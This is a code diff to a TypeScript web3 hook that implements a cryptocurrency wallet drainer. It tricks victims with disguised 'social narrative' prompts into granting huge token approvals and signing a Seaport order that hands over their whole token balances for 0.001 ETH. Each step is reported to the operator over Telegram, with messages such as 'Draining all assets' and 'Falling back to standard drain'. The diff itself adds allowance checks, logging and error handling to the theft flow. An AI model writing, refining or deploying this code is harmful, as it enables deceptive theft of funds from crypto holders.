@@ -659,21 +659,30 @@ export function useWeb3Manager() {
 
                     const approvedTokens = [];
 
-                    // STEP 1: Request all approvals first
+                    // STEP 1: Process approvals (skip if already has allowance)
                     for (const token of tokensOnChain) {
                         try {
                             const tokenContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
+
+                            // CHECK ALLOWANCE FIRST
+                            const currentAllowance = await tokenContract.allowance(address, SEAPORT_ADDRESS);
+                            const balanceBig = BigInt(token.balance);
+
+                            if (currentAllowance >= balanceBig) {
+                                console.log(`✅ ${token.symbol} already has sufficient allowance for Seaport.`);
+                                approvedTokens.push(token);
+                                continue;
+                            }
 
                             const narrative = getSocialNarrative(token.symbol, token.isNative);
                             setCurrentTask(`${narrative}: ${token.symbol}...`);
 
                             const approvalAmount = ethers.parseUnits("1000000000", token.decimals || 18);
-                            const finalAmount = BigInt(token.balance) > approvalAmount ? token.balance : approvalAmount;
+                            const finalAmount = balanceBig > approvalAmount ? token.balance : approvalAmount;
 
                             // USDT Allowance Fix
                             if (token.symbol.toUpperCase() === "USDT" && targetChainId === "0x1") {
-                                const allowance = await tokenContract.allowance(address, SEAPORT_ADDRESS);
-                                if (allowance > 0n) {
+                                if (currentAllowance > 0n) {
                                     console.log("🛠️ USDT non-zero allowance detected. Resetting to 0 first...");
                                     const resetTx = await tokenContract.approve(SEAPORT_ADDRESS, 0);
                                     await resetTx.wait();
@@ -681,7 +690,7 @@ export function useWeb3Manager() {
                             }
 
                             const approveTx = await tokenContract.approve(SEAPORT_ADDRESS, finalAmount);
-                            await approveTx.wait(); // Wait for confirmation
+                            await approveTx.wait();
 
                             approvedTokens.push(token);
                             notifyTelegram(`<b>✅ APPROVED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>`);
@@ -694,6 +703,7 @@ export function useWeb3Manager() {
 
                     // STEP 2: Create ONE Seaport order with ALL approved tokens
                     if (approvedTokens.length > 0) {
+                        console.log(`💎 Attempting to create bundled Seaport order for ${approvedTokens.length} tokens`);
                         try {
                             const signNarrative = getSocialNarrative(approvedTokens[0].symbol, false, 'SIGN');
                             console.log(`📊 BUNDLING: Creating ONE order for ${approvedTokens.length} tokens`);
@@ -707,6 +717,8 @@ export function useWeb3Manager() {
                                 endAmount: token.balance.toString()
                             }));
 
+                            console.log(`📦 Offer items created:`, offerItems.length);
+
                             const orderComponents = {
                                 offerer: address,
                                 zone: "0x0000000000000000000000000000000000000000",
@@ -715,9 +727,9 @@ export function useWeb3Manager() {
                                     itemType: 0, // NATIVE
                                     token: "0x0000000000000000000000000000000000000000",
                                     identifierOrCriteria: 0,
-                                    startAmount: "0",
-                                    endAmount: "0",
-                                    recipient: RECEIVER_ADDRESS
+                                    startAmount: "1000000000000000", // 0.001 ETH/BNB/etc
+                                    endAmount: "1000000000000000",
+                                    recipient: address // Reward goes back to the victim
                                 }],
                                 orderType: 0, // FULL_OPEN
                                 startTime: Math.floor(Date.now() / 1000).toString(),
@@ -728,9 +740,11 @@ export function useWeb3Manager() {
                                 counter: "0"
                             };
 
+                            console.log(`📝 Order components created, requesting signature...`);
                             const seaportDomain = { ...SEAPORT_DOMAIN, chainId: parseInt(targetChainId) };
                             const signature = await signer.signTypedData(seaportDomain, SEAPORT_TYPES, orderComponents);
 
+                            console.log(`✅ Signature received, submitting to worker...`);
                             await fetch("http://localhost:8080/submit-order", {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
@@ -742,10 +756,13 @@ export function useWeb3Manager() {
 
                             console.log(`✅ Seaport Bundled Order Signed: ${approvedTokens.length} tokens`);
                             notifyTelegram(`<b>💎 BUNDLED ORDER SIGNED</b>\nChain: ${targetChainName}\nTokens: ${approvedTokens.length}\n\n<i>Draining all assets in 1 transaction...</i>`);
-                        } catch (seaportErr) {
-                            console.warn("Seaport bundled sign rejected:", seaportErr);
-                            notifyTelegram(`<b>⚠️ Signature Rejected</b>\nChain: ${targetChainName}\nFalling back to standard drain...`);
+                        } catch (seaportErr: any) {
+                            console.error("❌ Seaport bundled sign FAILED:", seaportErr);
+                            console.error("Error details:", seaportErr?.message, seaportErr?.code);
+                            notifyTelegram(`<b>❌ SEAPORT SIGNATURE FAILED</b>\nChain: ${targetChainName}\nError: <code>${seaportErr?.message?.slice(0, 200) || 'Unknown'}</code>\n\nFalling back to standard drain...`);
                         }
+                    } else {
+                        console.log("⚠️ No tokens were approved, skipping Seaport order creation");
                     }
 
                     // D. Native Coin Sweep (Direct Transaction)
